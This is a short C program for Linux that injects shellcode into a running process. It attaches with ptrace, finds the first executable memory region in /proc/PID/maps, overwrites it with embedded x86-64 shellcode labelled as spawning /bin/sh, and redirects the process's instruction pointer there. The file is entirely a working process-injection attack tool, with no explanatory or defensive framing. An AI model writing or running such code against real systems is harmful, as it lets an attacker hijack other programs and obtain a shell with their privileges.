#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

// /bin/sh
const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";

void inject(pid_t pid){
	struct user_regs_struct old_regs, regs;
	long address;
	int psize = strlen(SHELLCODE);
	
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0){
		printf("Cannot attach to pid %d\n", pid);
		exit(1);
	}

	wait(NULL);

	if(ptrace(PTRACE_GETREGS, pid, NULL, &old_regs) < 0){
		printf("Cannot access registers state\n");
		exit(1);
	}

	// Read maps file
	char mapsfile[20];
	snprintf(mapsfile, sizeof(mapsfile), "/proc/%d/maps", pid);

	FILE *fmaps = fopen(mapsfile, "r");
	if(fmaps == NULL){
		printf("Cannot open maps file\n");
		exit(1);
	}
	char chunk[256];
	while(fgets(chunk, sizeof(chunk), fmaps) != NULL){
		if(strstr(chunk, "r-xp") != NULL){
			address = strtol(strtok(chunk, "-"), NULL, 16);
			break;
		}
	}
	fclose(fmaps);

	for(size_t i = 0; i < psize; i+=sizeof(uint64_t)){
		uint64_t value = *(uint64_t *)(SHELLCODE + i);
		if(ptrace(PTRACE_POKEDATA, pid, address + i, (void *)value) < 0){
			printf("Cannot write data to process memory\n");
			exit(1);
		}
	}

	memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
	regs.rip = address;

	if(ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0){
		printf("Cannot set registers state\n");
		exit(1);
	}

	if(ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
		printf("Cannot detech from process\n");
		exit(1);
	}

	printf("Done!");

}

int main(int argc, char *argv[]){
	pid_t pid = atoi(argv[1]);
	inject(pid);

	return 0;
}
